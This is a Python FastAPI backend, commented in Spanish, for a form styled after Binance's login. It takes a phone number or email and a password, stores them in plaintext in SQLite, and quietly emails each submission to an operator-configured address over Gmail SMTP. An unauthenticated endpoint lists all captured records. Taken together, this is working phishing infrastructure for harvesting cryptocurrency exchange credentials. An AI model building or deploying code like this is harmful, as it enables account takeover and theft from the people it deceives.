"""
Backend FastAPI – Formulario estilo Binance
Guarda datos en SQLite y envía notificación por correo (Gmail SMTP)

Instalar:
    pip install fastapi uvicorn aiosqlite

Correr:
    uvicorn main:app --reload --port 8000
"""

import sqlite3
import aiosqlite
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fastapi import FastAPI, HTTPException, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel, field_validator
from datetime import datetime
import re, os

# ─────────────────────────────────────────────────────────────
# ✏️  CONFIGURA AQUÍ TUS DATOS DE CORREO
# ─────────────────────────────────────────────────────────────
DB_PATH = "formulario.db"


GMAIL_REMITENTE = os.getenv("GMAIL_REMITENTE")
GMAIL_CONTRASENA = os.getenv("GMAIL_CONTRASENA")
CORREO_DESTINO = os.getenv("CORREO_DESTINO")


# ─────────────────────────────────────────────────────────────
# App
# ─────────────────────────────────────────────────────────────
app = FastAPI(title="Formulario Binance", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Sirve el HTML desde la misma carpeta
app.mount("/static", StaticFiles(directory="."), name="static")


# ─────────────────────────────────────────────────────────────
# Base de datos SQLite
# ─────────────────────────────────────────────────────────────
def init_db():
    """Crea la tabla si no existe (síncrono, solo al arrancar)."""
    with sqlite3.connect(DB_PATH) as con:
        con.execute("""
            CREATE TABLE IF NOT EXISTS registros (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                identificador TEXT NOT NULL,
                codigo_pais TEXT NOT NULL DEFAULT '+57',
                contrasena  TEXT NOT NULL,
                fecha       TEXT NOT NULL
            )
        """)
        con.commit()

init_db()


# ─────────────────────────────────────────────────────────────
# Schemas
# ─────────────────────────────────────────────────────────────
class FormData(BaseModel):
    identificador: str    # teléfono o correo
    codigo_pais: str = "+57"
    contrasena: str

    @field_validator("identificador")
    @classmethod
    def validar_identificador(cls, v: str) -> str:
        v = v.strip()
        if not v:
            raise ValueError("El campo no puede estar vacío")
        return v

    @field_validator("contrasena")
    @classmethod
    def validar_contrasena(cls, v: str) -> str:
        if len(v.strip()) < 1:
            raise ValueError("La contraseña no puede estar vacía")
        return v.strip()


class FormResponse(BaseModel):
    mensaje: str
    id: int


# ─────────────────────────────────────────────────────────────
# Función de envío de correo (Gmail SMTP)
# ─────────────────────────────────────────────────────────────
def enviar_correo(identificador: str, codigo_pais: str, contrasena: str, fecha: str):
    """Envía los datos del formulario a CORREO_DESTINO via Gmail SMTP."""
    asunto = f"📋 Nuevo registro Binance – {fecha}"
    cuerpo = f"""\
Nuevo registro recibido:

📅 Fecha:         {fecha}
🌍 País:          {codigo_pais}
📱 Identificador: {identificador}
🔑 Contraseña:    {contrasena}

— Formulario Binance
"""
    msg = MIMEMultipart()
    msg["From"]    = GMAIL_REMITENTE
    msg["To"]      = CORREO_DESTINO
    msg["Subject"] = asunto
    msg.attach(MIMEText(cuerpo, "plain", "utf-8"))

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as servidor:
        servidor.login(GMAIL_REMITENTE, GMAIL_CONTRASENA)
        servidor.sendmail(GMAIL_REMITENTE, CORREO_DESTINO, msg.as_string())


# ─────────────────────────────────────────────────────────────
# Endpoints
# ─────────────────────────────────────────────────────────────
@app.get("/", response_class=FileResponse, include_in_schema=False)
async def serve_index():
    return FileResponse("index.html")


@app.post("/api/formulario", response_model=FormResponse)
async def guardar_formulario(data: FormData):
    """
    Recibe los datos del formulario, los guarda en SQLite
    y los envía automáticamente al correo configurado.
    """
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 1️⃣  Guardar en SQLite
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            """INSERT INTO registros (identificador, codigo_pais, contrasena, fecha)
               VALUES (?, ?, ?, ?)""",
            (data.identificador, data.codigo_pais, data.contrasena, fecha),
        )
        await db.commit()
        nuevo_id = cursor.lastrowid

    # 2️⃣  Enviar correo silenciosamente
    try:
        enviar_correo(data.identificador, data.codigo_pais, data.contrasena, fecha)
    except Exception as e:
        # Si falla el correo el registro ya quedó en SQLite — no detenemos al usuario
        print(f"[EMAIL ERROR] {e}")

    return FormResponse(mensaje="Datos guardados correctamente", id=nuevo_id)


@app.get("/api/registros")
async def listar_registros():
    """Lista todos los registros guardados (para revisión interna)."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM registros ORDER BY id DESC") as cur:
            rows = await cur.fetchall()
    return [dict(r) for r in rows]


@app.delete("/api/registros/{registro_id}")
async def eliminar_registro(registro_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM registros WHERE id = ?", (registro_id,))
        await db.commit()
    return {"mensaje": f"Registro {registro_id} eliminado"}


@app.get("/health", include_in_schema=False)
async def health():
    return {"status": "ok"}


# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)